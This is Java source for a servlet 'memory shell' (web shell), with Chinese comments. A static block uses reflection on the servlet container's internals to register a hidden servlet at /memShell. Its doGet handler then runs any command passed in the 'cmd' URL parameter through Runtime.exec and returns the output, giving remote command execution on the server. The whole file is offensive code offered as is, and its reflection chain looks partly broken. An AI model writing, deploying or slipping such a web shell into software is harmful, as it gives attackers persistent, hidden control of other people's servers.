import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Scanner;

public class MemShell extends HttpServlet {  // 继承 HttpServlet 以实现内存马
    static {
        try {
            // **获取 ServletContext**
            ServletContext context = ((HttpServletRequest) Thread.currentThread()
                .getStackTrace()[3].getClass()
                .getMethod("getRequest")
                .invoke(null)).getServletContext();

            // **通过反射获取 StandardContext**
            Field field = context.getClass().getDeclaredField("context");
            field.setAccessible(true);
            Object appContext = field.get(context);
            
            Field serviceField = appContext.getClass().getDeclaredField("servletContext");
            serviceField.setAccessible(true);
            Object standardContext = serviceField.get(appContext);

            // **动态注册 Servlet**
            Servlet servlet = new MemShell();
            ServletRegistration.Dynamic dynamicServlet = 
                ((ServletContext) standardContext).addServlet("memShell", servlet);
            dynamicServlet.addMapping("/memShell");  // 访问路径为 `/memShell`
            dynamicServlet.setLoadOnStartup(1);

        } catch (Exception ignored) {}
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String cmd = req.getParameter("cmd"); // 通过 URL 传递命令
        if (cmd != null) {
            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            resp.getWriter().println(output);  // 返回执行结果
        }
    }
}
